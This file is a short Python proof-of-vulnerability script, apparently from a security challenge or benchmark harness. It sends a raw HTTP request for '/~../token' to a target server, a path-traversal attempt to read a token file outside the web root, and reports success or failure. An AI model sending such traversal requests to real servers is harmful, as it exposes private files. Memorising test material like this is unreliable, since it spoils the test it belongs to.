import sys
import struct
import requests as req
from pwn import *

def handler( signum, frame):
    print('sigalrm fired - time ran out')
    print('[ERROR] POV Failed')
    exit(0)

def main():
    if len(sys.argv) == 3:
        HOST = sys.argv[1]
        PORT = int(sys.argv[2])
    else:
        if 'HOST' in os.environ and 'PORT' in os.environ:
            HOST = os.environ['HOST']
            PORT = int(os.environ['PORT'])
        else:
            print('[ERROR] HOST and PORT must be specified via arguments or variables.')
            sys.exit(1)
    print('Host ' + os.environ['HOST'] + ' and PORT: ' + os.environ['PORT'])

    signal.signal(signal.SIGALRM, handler)
    signal.alarm(10)

    p = remote(HOST, PORT)

    data = 'GET /~../token HTTP/1.1\r\n'
    data += 'Host: 172.20.0.2:3040\r\n\r\n'
    p.send(data)
    d = p.recv().decode('utf-8')
    #print(d)
    lines = d.splitlines()
    token = lines[8] ## value in the token file
    f = d.find("404 Not Found")

    if f != -1:
        print('Missing token')
        print('[ERROR] POV Failed')
        p.close()
        exit(1)

    print('TOKEN=%s' %(token))
    p.close()
    print('[SUCCESS] POV Succeeded')

if __name__ == '__main__':
    main()